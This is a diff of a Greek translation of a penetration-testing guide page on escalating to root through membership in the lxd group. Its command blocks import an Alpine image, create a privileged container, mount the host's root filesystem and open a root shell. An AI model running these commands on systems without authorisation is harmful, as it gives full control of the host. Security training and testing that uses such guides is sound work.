@@ -1,16 +1,18 @@
 # lxd/lxc Group - Privilege escalation
 
-Η συμμετοχή στην ομάδα διαχείρισης LXD του host (συνήθως _**lxd**_) μπορεί να παρέχει ένα path προς το root, επιτρέποντας τον πλήρη έλεγχο του daemon.<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
 
-## Exploiting χωρίς internet
+Η συμμετοχή στην ομάδα διαχείρισης LXD του host (συνήθως _**lxd**_) μπορεί να παρέχει έναν τρόπο για απόκτηση δικαιωμάτων root, επιτρέποντας τον πλήρη έλεγχο του daemon.<sup>[[1]](#references)</sup>
+
+## Exploiting without internet
 
 ### Method 1
 
-Μπορείτε να κατεβάσετε ένα Alpine image για χρήση με το LXD από ένα trusted repository.
-Ο image server του Canonical για το LXD δημοσιεύει daily builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-Απλώς κατεβάστε τα **lxd.tar.xz** και **rootfs.squashfs** από το νεότερο build (το όνομα του directory είναι η ημερομηνία).<sup>[[8]](#references)</sup>
+Μπορείτε να κατεβάσετε ένα Alpine image για χρήση με το LXD από ένα αξιόπιστο repository.
+Ο Canonical's LXD image server δημοσιεύει καθημερινά builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
+Απλώς κατεβάστε τόσο το **lxd.tar.xz** όσο και το **rootfs.squashfs** από το πιο πρόσφατο build (το όνομα του directory είναι η ημερομηνία).<sup>[[8]](#references)</sup>
 
-Εναλλακτικά, μπορείτε να εγκαταστήσετε το distrobuilder στο machine σας ακολουθώντας τις [project instructions](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
+Εναλλακτικά, μπορείτε να εγκαταστήσετε το distrobuilder στο μηχάνημά σας ακολουθώντας τις [οδηγίες του project](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 # Install requirements
 sudo apt update
@@ -33,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Μεταφορτώστε τα **incus.tar.xz** (**lxd.tar.xz** αν το κατεβάσατε από τον Canonical image server) και το **rootfs.squashfs**, έπειτα εισαγάγετε την image και δημιουργήστε ένα container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
+Ανεβάστε τα **incus.tar.xz** (**lxd.tar.xz** αν το κατεβάσατε από τον Canonical image server) και το **rootfs.squashfs**, έπειτα εισαγάγετε το image και δημιουργήστε ένα container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -49,10 +51,10 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Αν εμφανιστεί αυτό το σφάλμα _**Error: No storage pool found. Please create a new storage pool**_\
-> Εκτέλεσε **`lxd init`**, ρύθμισε ένα προεπιλεγμένο storage pool και, στη συνέχεια, επανέλαβε το προηγούμενο τμήμα εντολών.<sup>[[2]](#references)</sup>
+> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
+> Run **`lxd init`**, set up a default storage pool, then **repeat** the previous chunk of commands.<sup>[[2]](#references)</sup>
 
-Τέλος, εκκίνησε το container και άνοιξε ένα root shell στο filesystem του host:<sup>[[1]](#references)[[2]](#references)</sup>
+Τέλος, ξεκινήστε το container και ανοίξτε ένα root shell στο filesystem του host:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
@@ -60,7 +62,7 @@ lxc exec privesc /bin/sh
 ```
 ### Method 2
 
-Δημιουργήστε ένα Alpine image και εκκινήστε το με το flag `security.privileged=true`, το οποίο αντιστοιχίζει το root του container στο root του host· η προσάρτηση του `/` εκθέτει στη συνέχεια το filesystem του host μέσα στο container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
+Δημιουργήστε ένα Alpine image και εκκινήστε το με τη σημαία `security.privileged=true`, η οποία αντιστοιχίζει το root του container στο root του host· η προσάρτηση του `/` εκθέτει, στη συνέχεια, το filesystem του host μέσα στο container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -83,12 +85,12 @@ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursiv
 ## References
 
 - [1] [Πώς να ενισχύσετε την ασφάλεια για το LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
-- [2] [LXD containers και virtual machines](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
-- [3] [Πώς να αντιγράφετε και να εισάγετε images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
+- [2] [Containers και virtual machines του LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
+- [3] [Πώς να αντιγράψετε και να εισαγάγετε images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
 - [4] [distrobuilder](https://github.com/lxc/distrobuilder)
-- [5] [Πώς να δημιουργείτε images με το distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
-- [6] [Alpine image definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
-- [7] [lxd-alpine-builder build script](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
-- [8] [LXD image server](https://images.lxd.canonical.com/)
-- [9] [Type: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
+- [5] [Πώς να δημιουργήσετε images με το distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
+- [6] [Ορισμός image του Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
+- [7] [Script build του lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
+- [8] [Server image του LXD](https://images.lxd.canonical.com/)
+- [9] [Τύπος: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
 {{#include ../../../banners/hacktricks-training.md}}
